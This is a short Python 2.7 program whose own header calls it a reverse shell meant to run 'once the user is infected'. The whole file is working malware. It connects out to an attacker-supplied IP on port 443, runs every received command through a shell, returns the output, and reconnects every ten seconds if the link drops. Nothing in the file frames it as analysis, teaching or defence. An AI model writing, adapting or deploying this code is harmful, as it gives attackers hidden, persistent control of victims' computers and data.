# -*- coding: utf-8 -*-
'''
- The  program was created  to receive reverse shell -
Contact for e-mail =  gabriel.mmatos@proton.me
Maintenance = Gabriel  Matos
-------------------------------------------------
			########  Description ###########
This program was created to perform the reverse shell once the user is infected .
----------------------------------------------
Histórico:
	v1.0 24/02/2023

#-------------------------------------------
 Testado em:
Python 2.7

'''
import socket
import subprocess
import sys
import time
ip = "" # Enter  the IP of the machine that will receive the shell
porta = 443 # recomended 443
def acess(ip,porta): # This  function will perform the  TCP connection
    try:
        connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connection.connect((ip,porta))
        connection.send("incoming connection \n")
        return connection
    except Exception as error:
        print ("Error connect", error)
        return  None
def listen(connection): # This function will perform for received data input
    try:
        while True:
            data = connection.recv(1024)
            if data[:-1] == "/exit":
                connection.close()
                sys.exit()
            else:
                cmd(connection,data)
    except:
        main(connection)
def cmd(connection,data):
    try:
        process = subprocess.Popen(data,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        exit= process.stdout.read() + process.stderr.read()
        connection.send(exit)
    except:
        main(connection)
def main(connection):
    if connection:
     connection.close()
    while True:
        connection_c = acess(ip,porta)
        if connection_c:
            listen(listen(connection_c))
        else:
            print (" connection failed, try again ")
            time.sleep(10)

connection = None
main(connection)